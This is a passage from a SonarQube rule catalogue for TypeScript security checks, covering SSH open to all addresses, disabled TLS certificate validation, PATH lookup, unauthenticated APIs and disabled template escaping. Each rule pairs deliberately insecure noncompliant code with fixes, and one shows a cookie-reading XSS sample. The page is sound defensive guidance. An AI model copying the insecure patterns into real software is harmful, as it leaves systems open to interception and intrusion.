    networkInterfaces: [
        {
            deviceIndex: &#34;0&#34;,
            associatePublicIpAddress: false,
            deleteOnTermination: true,
            subnetId: vpc.selectSubnets({subnetType: ec2.SubnetType.PRIVATE_WITH_EGRESS}).subnetIds[0]
        }
    ]
})
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_dms.CfnReplicationInstance.html" rel="nofollow">aws-cdk-lib.aws_dms.CfnReplicationInstance</a>:</p>
<pre>
import {aws_ec2 as ec2} from &#39;aws-cdk-lib&#39;

new dms.CfnReplicationInstance(
    this, &#34;example&#34;, {
    replicationInstanceClass: &#34;dms.t2.micro&#34;,
    allocatedStorage: 5,
    publiclyAccessible: false,
    replicationSubnetGroupIdentifier: subnetGroup.replicationSubnetGroupIdentifier,
    vpcSecurityGroupIds: [vpc.vpcDefaultSecurityGroup]
})
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_rds.CfnDBInstance.html" rel="nofollow">aws-cdk-lib.aws_rds.CfnDBInstance</a>:</p>
<pre>
import {aws_ec2 as ec2} from &#39;aws-cdk-lib&#39;

const rdsSubnetGroupPrivate &#61; new rds.CfnDBSubnetGroup(this, &#34;example&#34;,{
    dbSubnetGroupDescription: &#34;Subnets&#34;,
    dbSubnetGroupName: &#34;privateSn&#34;,
    subnetIds: vpc.selectSubnets({
        subnetType: ec2.SubnetType.PRIVATE_WITH_EGRESS
    }).subnetIds
})

new rds.CfnDBInstance(this, &#34;example&#34;, {
    engine: &#34;postgres&#34;,
    masterUsername: &#34;foobar&#34;,
    masterUserPassword: &#34;12345678&#34;,
    dbInstanceClass: &#34;db.r5.large&#34;,
    allocatedStorage: &#34;200&#34;,
    iops: 1000,
    dbSubnetGroupName: rdsSubnetGroupPrivate.ref,
    publiclyAccessible: false,
    vpcSecurityGroups: [sg.securityGroupId]
})
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/using-instance-addressing.html" rel="nofollow">AWS Documentation</a> - Amazon EC2 instance IP
  addressing </li><li> <a href="https://docs.aws.amazon.com/dms/latest/userguide/CHAP_ReplicationInstance.PublicPrivate.html" rel="nofollow">AWS Documentation</a> - Public and
  private replication instances </li><li> <a href="https://docs.aws.amazon.com/vpc/latest/peering/what-is-vpc-peering.html" rel="nofollow">AWS Documentation</a> - VPC Peering </li><li> <a href="https://cwe.mitre.org/data/definitions/284" rel="nofollow">MITRE, CWE-284</a> - Improper Access Control </li><li> <a href="https://cwe.mitre.org/data/definitions/668" rel="nofollow">MITRE, CWE-668</a> - Exposure of Resource to Wrong Sphere </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control" rel="nofollow">OWASP Top 10 2017 Category A5</a> - Broken Access Control
  </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S4829">
              typescript:S4829
            </a>
          </td>
          <td>
            <details>
              <p>This rule is deprecated, and will eventually be removed.</p>
<p>Reading Standard Input is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2005-2337" rel="nofollow">CVE-2005-2337</a> </li><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2017-11449" rel="nofollow">CVE-2017-11449</a> </li></ul>
<p>It is common for attackers to craft inputs enabling them to exploit software vulnerabilities. Thus any data read from the standard input (stdin)
can be dangerous and should be validated.</p>
<p>This rule flags code that reads from the standard input.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> data read from the standard input is not sanitized before being used. </li></ul>
<p>You are at risk if you answered yes to this question.</p>
<h2>Recommended Secure Coding Practices</h2>
<p><a href="https://www.owasp.org/index.php/Input_Validation_Cheat_Sheet" rel="nofollow">Sanitize</a> all data read from the standard input before using it.</p>
<h2>Sensitive Code Example</h2>
<pre>
// The process object is a global that provides information about, and control over, the current Node.js process
// All uses of process.stdin are security-sensitive and should be reviewed

process.stdin.on(&#39;readable&#39;, () &#61;&gt; {
	const chunk &#61; process.stdin.read(); // Sensitive
	if (chunk !&#61;&#61; null) {
		dosomething(chunk);
	}
});

const readline &#61; require(&#39;readline&#39;);
readline.createInterface({
	input: process.stdin // Sensitive
}).on(&#39;line&#39;, (input) &#61;&gt; {
	dosomething(input);
});
</pre>
<h2>See</h2>
<ul><li> <a href="https://cwe.mitre.org/data/definitions/20" rel="nofollow">MITRE, CWE-20</a> - Improper Input Validation </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S4823">
              typescript:S4823
            </a>
          </td>
          <td>
            <details>
              <p>This rule is deprecated, and will eventually be removed.</p>
<p>Using command line arguments is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2018-7281" rel="nofollow">CVE-2018-7281</a> </li><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2018-12326" rel="nofollow">CVE-2018-12326</a> </li><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2011-3198" rel="nofollow">CVE-2011-3198</a> </li></ul>
<p>Command line arguments can be dangerous just like any other user input. They should never be used without being first validated and sanitized.</p>
<p>Remember also that any user can retrieve the list of processes running on a system, which makes the arguments provided to them visible. Thus
passing sensitive information via command line arguments should be considered as insecure.</p>
<p>This rule raises an issue when on every program entry points (<code>main</code> methods) when command line arguments are used. The goal is to guide
security code reviews.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> any of the command line arguments are used without being sanitized first. </li><li> your application accepts sensitive information via command line arguments. </li></ul>
<p>If you answered yes to any of these questions you are at risk.</p>
<h2>Recommended Secure Coding Practices</h2>
<p><a href="https://www.owasp.org/index.php/Input_Validation_Cheat_Sheet" rel="nofollow">Sanitize</a> all command line arguments before using them.</p>
<p>Any user or application can list running processes and see the command line arguments they were started with. There are safer ways of providing
sensitive information to an application than exposing them in the command line. It is common to write them on the process&#39; standard input, or give the
path to a file containing the information.</p>
<h2>Sensitive Code Example</h2>
<pre>
// The process object is a global that provides information about, and control over, the current Node.js process
var param &#61; process.argv[2]; // Sensitive: check how the argument is used
console.log(&#39;Param: &#39; &#43; param);
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection" rel="nofollow">OWASP Top 10 2017 Category A1</a> - Injection </li><li> <a href="https://cwe.mitre.org/data/definitions/88" rel="nofollow">MITRE, CWE-88</a> - Argument Injection or Modification </li><li> <a href="https://cwe.mitre.org/data/definitions/214" rel="nofollow">MITRE, CWE-214</a> - Information Exposure Through Process Environment </li><li> <a href="https://www.sans.org/top25-software-errors/#cat1" rel="nofollow">SANS Top 25</a> - Insecure Interaction Between Components </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S6321">
              typescript:S6321
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Cloud platforms such as AWS, Azure, or GCP support virtual firewalls that can be used to restrict access to services by controlling inbound and
outbound traffic.<br /> Any firewall rule allowing traffic from all IP addresses to standard network ports on which administration services
traditionally listen, such as 22 for SSH, can expose these services to exploits and unauthorized access.</p>
<h3>What is the potential impact?</h3>
<p>Like any other service, administration services can contain vulnerabilities. Administration services run with elevated privileges and thus a
vulnerability could have a high impact on the system.</p>
<p>Additionally, credentials might be leaked through phishing or similar techniques. Attackers who are able to reach the services could use the
credentials to log in to the system.</p>
<h2>How to fix it</h2>
<p>It is recommended to restrict access to remote administration services to only trusted IP addresses. In practice, trusted IP addresses are those
held by system administrators or those of <a href="https://aws.amazon.com/quickstart/architecture/linux-bastion/?nc1&#61;h_ls" rel="nofollow">bastion-like</a>
servers.</p>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_ec2.Instance.html" rel="nofollow">aws-cdk-lib.aws_ec2.Instance</a> and other constructs
that support a <code>connections</code> attribute:</p>
<pre data-diff-id="1" data-diff-type="noncompliant">
import {aws_ec2 as ec2} from &#39;aws-cdk-lib&#39;

const instance &#61; new ec2.Instance(this, &#34;default-own-security-group&#34;,{
    instanceType: nanoT2,
    machineImage: ec2.MachineImage.latestAmazonLinux(),
    vpc: vpc,
    instanceName: &#34;test-instance&#34;
})

instance.connections.allowFrom(
    ec2.Peer.anyIpv4(), // Noncompliant
    ec2.Port.tcp(22),
    /*description*/ &#34;Allows SSH from all IPv4&#34;
)
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_ec2.SecurityGroup.html" rel="nofollow">aws-cdk-lib.aws_ec2.SecurityGroup</a></p>
<pre data-diff-id="2" data-diff-type="noncompliant">
import {aws_ec2 as ec2} from &#39;aws-cdk-lib&#39;

const securityGroup &#61; new ec2.SecurityGroup(this, &#34;custom-security-group&#34;, {
    vpc: vpc
})

securityGroup.addIngressRule(
    ec2.Peer.anyIpv4(), // Noncompliant
    ec2.Port.tcpRange(1, 1024)
)
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_ec2.CfnSecurityGroup.html" rel="nofollow">aws-cdk-lib.aws_ec2.CfnSecurityGroup</a></p>
<pre data-diff-id="3" data-diff-type="noncompliant">
import {aws_ec2 as ec2} from &#39;aws-cdk-lib&#39;

new ec2.CfnSecurityGroup(
    this,
    &#34;cfn-based-security-group&#34;, {
        groupDescription: &#34;cfn based security group&#34;,
        groupName: &#34;cfn-based-security-group&#34;,
        vpcId: vpc.vpcId,
        securityGroupIngress: [
            {
                ipProtocol: &#34;6&#34;,
                cidrIp: &#34;0.0.0.0/0&#34;, // Noncompliant
                fromPort: 22,
                toPort: 22
            }
        ]
    }
)
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_ec2.CfnSecurityGroupIngress.html" rel="nofollow">aws-cdk-lib.aws_ec2.CfnSecurityGroupIngress</a></p>
<pre data-diff-id="4" data-diff-type="noncompliant">
import {aws_ec2 as ec2} from &#39;aws-cdk-lib&#39;

new ec2.CfnSecurityGroupIngress( // Noncompliant
    this,
    &#34;ingress-all-ip-tcp-ssh&#34;, {
        ipProtocol: &#34;tcp&#34;,
        cidrIp: &#34;0.0.0.0/0&#34;,
        fromPort: 22,
        toPort: 22,
        groupId: securityGroup.attrGroupId
})
</pre>
<h4>Compliant solution</h4>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_ec2.Instance.html" rel="nofollow">aws-cdk-lib.aws_ec2.Instance</a> and other constructs
that support a <code>connections</code> attribute:</p>
<pre data-diff-id="1" data-diff-type="compliant">
import {aws_ec2 as ec2} from &#39;aws-cdk-lib&#39;

const instance &#61; new ec2.Instance(this, &#34;default-own-security-group&#34;,{
    instanceType: nanoT2,
    machineImage: ec2.MachineImage.latestAmazonLinux(),
    vpc: vpc,
    instanceName: &#34;test-instance&#34;
})

instance.connections.allowFrom(
    ec2.Peer.ipv4(&#34;192.0.2.0/24&#34;),
    ec2.Port.tcp(22),
    /*description*/ &#34;Allows SSH from a trusted range&#34;
)
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_ec2.SecurityGroup.html" rel="nofollow">aws-cdk-lib.aws_ec2.SecurityGroup</a></p>
<pre data-diff-id="2" data-diff-type="compliant">
import {aws_ec2 as ec2} from &#39;aws-cdk-lib&#39;

const securityGroup3 &#61; new ec2.SecurityGroup(this, &#34;custom-security-group&#34;, {
    vpc: vpc
})

securityGroup3.addIngressRule(
    ec2.Peer.anyIpv4(),
    ec2.Port.tcpRange(1024, 1048)
)
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_ec2.CfnSecurityGroup.html" rel="nofollow">aws-cdk-lib.aws_ec2.CfnSecurityGroup</a></p>
<pre data-diff-id="3" data-diff-type="compliant">
import {aws_ec2 as ec2} from &#39;aws-cdk-lib&#39;

new ec2.CfnSecurityGroup(
    this,
    &#34;cfn-based-security-group&#34;, {
        groupDescription: &#34;cfn based security group&#34;,
        groupName: &#34;cfn-based-security-group&#34;,
        vpcId: vpc.vpcId,
        securityGroupIngress: [
            {
                ipProtocol: &#34;6&#34;,
                cidrIp: &#34;192.0.2.0/24&#34;,
                fromPort: 22,
                toPort: 22
            }
        ]
    }
)
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_ec2.CfnSecurityGroupIngress.html" rel="nofollow">aws-cdk-lib.aws_ec2.CfnSecurityGroupIngress</a></p>
<pre data-diff-id="4" data-diff-type="compliant">
new ec2.CfnSecurityGroupIngress(
    this,
    &#34;ingress-all-ipv4-tcp-http&#34;, {
        ipProtocol: &#34;6&#34;,
        cidrIp: &#34;0.0.0.0/0&#34;,
        fromPort: 80,
        toPort: 80,
        groupId: securityGroup.attrGroupId
    }
)
</pre>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul><li> <a href="https://docs.aws.amazon.com/vpc/latest/userguide/VPC_SecurityGroups.html" rel="nofollow">AWS Documentation</a> - Security groups for your VPC </li><li> <a href="https://docs.microsoft.com/en-us/azure/virtual-network/network-security-groups-overview" rel="nofollow">Azure Documentation</a> - Network security
  groups </li><li> <a href="https://cloud.google.com/vpc/docs/using-firewalls" rel="nofollow">GCP Documentation</a> - Firewalls </li></ul>
<h3>Standards</h3>
<ul><li> <a href="https://cwe.mitre.org/data/definitions/284" rel="nofollow">MITRE, CWE-284</a> - Improper Access Control </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control" rel="nofollow">OWASP Top 10 2017 Category A5</a> - Broken Access Control
  </li><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S4830">
              typescript:S4830
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability makes it possible that an encrypted communication is intercepted.</p>
<h2>Why is this an issue?</h2>
<p>Transport Layer Security (TLS) provides secure communication between systems over the internet by encrypting the data sent between them. The role
of certificate validation in this process is to ensure that a system is indeed the one it claims to be, adding an extra layer of trust and
security.</p>
<p>When certificate validation is disabled, the client skips this critical check. This creates an opportunity for attackers to pose as a trusted
entity and intercept, manipulate, or steal the data being transmitted.</p>
<h3>What is the potential impact?</h3>
<p>Establishing trust in a secure way is a non-trivial task. When you disable certificate validation, you are removing a key mechanism designed to
build this trust in internet communication, opening your system up to a number of potential threats.</p>
<h4>Identity spoofing</h4>
<p>If a system does not validate certificates, it cannot confirm the identity of the other party involved in the communication. An attacker can
exploit this by creating a fake server and masquerading it as a legitimate one. For example, they might set up a server that looks like your bank’s
server, tricking your system into thinking it is communicating with the bank. This scenario, called identity spoofing, allows the attacker to collect
any data your system sends to them, potentially leading to significant data breaches.</p>
<h4>Loss of data integrity</h4>
<p>When TLS certificate validation is disabled, the integrity of the data you send and receive cannot be guaranteed. An attacker could modify the data
in transit, and you would have no way of knowing. This could range from subtle manipulations of the data you receive to the injection of malicious
code or malware into your system. The consequences of such breaches of data integrity can be severe, depending on the nature of the data and the
system.</p>
<h2>How to fix it in Node.js</h2>
<h3>Code examples</h3>
<p>The following code contains examples of disabled certificate validation.</p>
<p>The certificate validation gets disabled by setting <code>rejectUnauthorized</code> to <code>false</code>. To enable validation set the value to
<code>true</code> or do not set <code>rejectUnauthorized</code> at all to use the secure default value.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
const https &#61; require(&#39;node:https&#39;);

let options &#61; {
  hostname: &#39;www.example.com&#39;,
  port: 443,
  path: &#39;/&#39;,
  method: &#39;GET&#39;,
  rejectUnauthorized: false,
  secureProtocol: &#39;TLSv1_2_method&#39;
};

let req &#61; https.request(options, (res) &#61;&gt; {
  res.on(&#39;data&#39;, (d) &#61;&gt; {
    process.stdout.write(d);
  });
}); // Noncompliant
</pre>
<pre data-diff-id="2" data-diff-type="noncompliant">
const tls &#61; require(&#39;node:tls&#39;);

let options &#61; {
    rejectUnauthorized: false,
    secureProtocol: &#39;TLSv1_2_method&#39;
};

let socket &#61; tls.connect(443, &#34;www.example.com&#34;, options, () &#61;&gt; {
  process.stdin.pipe(socket);
  process.stdin.resume();
}); // Noncompliant
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
const https &#61; require(&#39;node:https&#39;);

let options &#61; {
  hostname: &#39;www.example.com&#39;,
  port: 443,
  path: &#39;/&#39;,
  method: &#39;GET&#39;,
  secureProtocol: &#39;TLSv1_2_method&#39;
};

let req &#61; https.request(options, (res) &#61;&gt; {
  res.on(&#39;data&#39;, (d) &#61;&gt; {
    process.stdout.write(d);
  });
});
</pre>
<pre data-diff-id="2" data-diff-type="compliant">
const tls &#61; require(&#39;node:tls&#39;);

let options &#61; {
    secureProtocol: &#39;TLSv1_2_method&#39;
};

let socket &#61; tls.connect(443, &#34;www.example.com&#34;, options, () &#61;&gt; {
  process.stdin.pipe(socket);
  process.stdin.resume();
});
</pre>
<h3>How does this work?</h3>
<p>Addressing the vulnerability of disabled TLS certificate validation primarily involves re-enabling the default validation.</p>
<p>To avoid running into problems with invalid certificates, consider the following sections.</p>
<h4>Using trusted certificates</h4>
<p>If possible, always use a certificate issued by a well-known, trusted CA for your server. Most programming environments come with a predefined list
of trusted root CAs, and certificates issued by these authorities are validated automatically. This is the best practice, and it requires no
additional code or configuration.</p>
<h4>Working with self-signed certificates or non-standard CAs</h4>
<p>In some cases, you might need to work with a server using a self-signed certificate, or a certificate issued by a CA not included in your trusted
roots. Rather than disabling certificate validation in your code, you can add the necessary certificates to your trust store.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/" rel="nofollow">OWASP Top 10 2021 Category A7</a> - Identification and
  Authentication Failures </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m3-insecure-communication" rel="nofollow">OWASP Mobile Top 10 2016 Category M3</a> - Insecure
  Communication </li><li> <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x10-v5-network_communication_requirements" rel="nofollow">Mobile AppSec Verification
  Standard</a> - Network Communication Requirements </li><li> <a href="https://cwe.mitre.org/data/definitions/295" rel="nofollow">MITRE, CWE-295</a> - Improper Certificate Validation </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S4036">
              typescript:S4036
            </a>
          </td>
          <td>
            <details>
              <p>When executing an OS command and unless you specify the full path to the executable, then the locations in your application’s <code>PATH</code>
environment variable will be searched for the executable. That search could leave an opening for an attacker if one of the elements in
<code>PATH</code> is a directory under his control.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The directories in the PATH environment variable may be defined by not trusted entities. </li></ul>
<p>There is a risk if you answered yes to this question.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Fully qualified/absolute path should be used to specify the OS command to execute.</p>
<h2>Sensitive Code Example</h2>
<pre>
const cp &#61; require(&#39;child_process&#39;);
cp.exec(&#39;file.exe&#39;); // Sensitive
</pre>
<h2>Compliant Solution</h2>
<pre>
const cp &#61; require(&#39;child_process&#39;);
cp.exec(&#39;/usr/bin/file.exe&#39;); // Compliant
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/" rel="nofollow">OWASP Top 10 2021 Category A8</a> - Software and Data
  Integrity Failures </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection" rel="nofollow">OWASP Top 10 2017 Category A1</a> - Injection </li><li> <a href="https://cwe.mitre.org/data/definitions/426" rel="nofollow">MITRE, CWE-426</a> - Untrusted Search Path </li><li> <a href="https://cwe.mitre.org/data/definitions/427" rel="nofollow">MITRE, CWE-427</a> - Uncontrolled Search Path Element </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S6333">
              typescript:S6333
            </a>
          </td>
          <td>
            <details>
              <p>Creating APIs without authentication unnecessarily increases the attack surface on the target infrastructure.</p>
<p>Unless another authentication method is used, attackers have the opportunity to attempt attacks against the underlying API.<br /> This means attacks
both on the functionality provided by the API and its infrastructure.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The underlying API exposes all of its contents to any anonymous Internet user. </li></ul>
<p>There is a risk if you answered yes to this question.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>In general, prefer limiting API access to a specific set of people or entities.</p>
<p>AWS provides multiple methods to do so:</p>
<ul><li> <code>AWS_IAM</code>, to use standard AWS IAM roles and policies. </li><li> <code>COGNITO_USER_POOLS</code>, to use customizable OpenID Connect (OIDC) identity providers (IdP). </li><li> <code>CUSTOM</code>, to use an AWS-independant OIDC provider, glued to the infrastructure with a Lambda authorizer. </li></ul>
<h2>Sensitive Code Example</h2>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_apigateway.Resource.html" rel="nofollow">aws-cdk-lib.aws_apigateway.Resource</a>:</p>
<pre>
import {aws_apigateway as apigateway} from &#34;aws-cdk-lib&#34;

const resource &#61; api.root.addResource(&#34;example&#34;)
resource.addMethod(
    &#34;GET&#34;,
    new apigateway.HttpIntegration(&#34;https://example.org&#34;),
    {
        authorizationType: apigateway.AuthorizationType.NONE // Sensitive
    }
)
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_apigatewayv2.CfnRoute.html" rel="nofollow">aws-cdk-lib.aws_apigatewayv2.CfnRoute</a>:</p>
<pre>
import {aws_apigatewayv2 as apigateway} from &#34;aws-cdk-lib&#34;

new apigateway.CfnRoute(this, &#34;no-auth&#34;, {
    apiId: api.ref,
    routeKey: &#34;GET /no-auth&#34;,
    authorizationType: &#34;NONE&#34;, // Sensitive
    target: exampleIntegration
})
</pre>
<h2>Compliant Solution</h2>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_apigateway.Resource.html" rel="nofollow">aws-cdk-lib.aws_apigateway.Resource</a>:</p>
<pre>
import {aws_apigateway as apigateway} from &#34;aws-cdk-lib&#34;

const resource &#61; api.root.addResource(&#34;example&#34;,{
    defaultMethodOptions:{
        authorizationType: apigateway.AuthorizationType.IAM
    }
})
resource.addMethod(
    &#34;POST&#34;,
    new apigateway.HttpIntegration(&#34;https://example.org&#34;),
    {
        authorizationType: apigateway.AuthorizationType.IAM
    }
)
resource.addMethod(  // authorizationType is inherited from the Resource&#39;s configured defaultMethodOptions
    &#34;GET&#34;
)
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_apigatewayv2.CfnRoute.html" rel="nofollow">aws-cdk-lib.aws_apigatewayv2.CfnRoute</a>:</p>
<pre>
import {aws_apigatewayv2 as apigateway} from &#34;aws-cdk-lib&#34;

new apigateway.CfnRoute(this, &#34;auth&#34;, {
    apiId: api.ref,
    routeKey: &#34;POST /auth&#34;,
    authorizationType: &#34;AWS_IAM&#34;,
    target: exampleIntegration
})
</pre>
<h2>See</h2>
<ul><li> <a href="https://docs.aws.amazon.com/apigateway/latest/developerguide/apigateway-control-access-to-api.html" rel="nofollow">AWS Documentation</a> -
  Controlling and managing access to a REST API in API Gateway </li><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://cwe.mitre.org/data/definitions/284" rel="nofollow">MITRE, CWE-284</a> - Improper Access Control </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control" rel="nofollow">OWASP Top 10 2017 Category A5</a> - Broken Access Control
  </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S5247">
              typescript:S5247
            </a>
          </td>
          <td>
            <details>
              <p>To reduce the risk of cross-site scripting attacks, templating systems, such as <code>Twig</code>, <code>Django</code>, <code>Smarty</code>,
<code>Groovy&#39;s template engine</code>, allow configuration of automatic variable escaping before rendering templates. When escape occurs, characters
that make sense to the browser (eg: &lt;a&gt;) will be transformed/replaced with escaped/sanitized values (eg: &amp; lt;a&amp; gt; ).</p>
<p>Auto-escaping is not a magic feature to annihilate all cross-site scripting attacks, it depends on <a href="https://twig.symfony.com/doc/3.x/filters/escape.html" rel="nofollow">the strategy applied</a> and the context, for example a &#34;html auto-escaping&#34; strategy
(which only transforms html characters into <a href="https://developer.mozilla.org/en-US/docs/Glossary/Entity" rel="nofollow">html entities</a>) will not be relevant
when variables are used in a <a href="https://en.wikipedia.org/wiki/HTML_attribute" rel="nofollow">html attribute</a> because &#39;<code>:</code>&#39; character is not
escaped and thus an attack as below is possible:</p>
<pre>
&lt;a href&#61;&#34;{<!-- -->{ myLink }}&#34;&gt;link&lt;/a&gt; // myLink &#61; javascript:alert(document.cookie)
&lt;a href&#61;&#34;javascript:alert(document.cookie)&#34;&gt;link&lt;/a&gt; // JS injection (XSS attack)
</pre>
<h2>Ask Yourself Whether</h2>
<ul><li> Templates are used to render web content and
    <ul><li> dynamic variables in templates come from untrusted locations or are user-controlled inputs </li><li> there is no local mechanism in place to sanitize or validate the inputs. </li></ul>  </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Enable auto-escaping by default and continue to review the use of inputs in order to be sure that the chosen auto-escaping strategy is the right
one.</p>
<h2>Sensitive Code Example</h2>
<p><a href="https://www.npmjs.com/package/mustache" rel="nofollow">mustache.js</a> template engine:</p>
<pre>
let Mustache &#61; require(&#34;mustache&#34;);

Mustache.escape &#61; function(text) {return text;}; // Sensitive

let rendered &#61; Mustache.render(template, { name: inputName });
</pre>
<p><a href="https://www.npmjs.com/package/handlebars" rel="nofollow">handlebars.js</a> template engine:</p>
<pre>
const Handlebars &#61; require(&#39;handlebars&#39;);

let source &#61; &#34;&lt;p&gt;attack {<!-- -->{name}}&lt;/p&gt;&#34;;

let template &#61; Handlebars.compile(source, { noEscape: true }); // Sensitive
</pre>
<p><a href="https://www.npmjs.com/package/markdown-it" rel="nofollow">markdown-it</a> markup language parser:</p>
<pre>
const markdownIt &#61; require(&#39;markdown-it&#39;);
let md &#61; markdownIt({
  html: true // Sensitive
});

let result &#61; md.render(&#39;# &lt;b&gt;attack&lt;/b&gt;&#39;);
</pre>
<p><a href="https://www.npmjs.com/package/marked" rel="nofollow">marked</a> markup language parser:</p>
<pre>
const marked &#61; require(&#39;marked&#39;);

marked.setOptions({
  renderer: new marked.Renderer(),
  sanitize: false // Sensitive
});

console.log(marked(&#34;# test &lt;b&gt;attack/b&gt;&#34;));
</pre>
<p><a href="https://www.npmjs.com/package/kramed" rel="nofollow">kramed</a> markup language parser:</p>
<pre>
let kramed &#61; require(&#39;kramed&#39;);

var options &#61; {
  renderer: new kramed.Renderer({
    sanitize: false // Sensitive
  })
};
</pre>
<h2>Compliant Solution</h2>
<p><a href="https://www.npmjs.com/package/mustache" rel="nofollow">mustache.js</a> template engine:</p>
<pre>
let Mustache &#61; require(&#34;mustache&#34;);

let rendered &#61; Mustache.render(template, { name: inputName }); // Compliant autoescaping is on by default
</pre>
<p><a href="https://www.npmjs.com/package/handlebars" rel="nofollow">handlebars.js</a> template engine:</p>
<pre>
const Handlebars &#61; require(&#39;handlebars&#39;);

let source &#61; &#34;&lt;p&gt;attack {<!-- -->{name}}&lt;/p&gt;&#34;;
let data &#61; { &#34;name&#34;: &#34;&lt;b&gt;Alan&lt;/b&gt;&#34; };

let template &#61; Handlebars.compile(source); // Compliant by default noEscape is set to false
</pre>
<p><a href="https://www.npmjs.com/package/markdown-it" rel="nofollow">markdown-it</a> markup language parser:</p>
<pre>
let md &#61; require(&#39;markdown-it&#39;)(); // Compliant by default html is set to false

let result &#61; md.render(&#39;# &lt;b&gt;attack&lt;/b&gt;&#39;);
</pre>
<p><a href="https://www.npmjs.com/package/marked" rel="nofollow">marked</a> markup language parser:</p>
<pre>
const marked &#61; require(&#39;marked&#39;);

marked.setOptions({
  renderer: new marked.Renderer()
}); // Compliant by default sanitize is set to true

console.log(marked(&#34;# test &lt;b&gt;attack/b&gt;&#34;));
</pre>
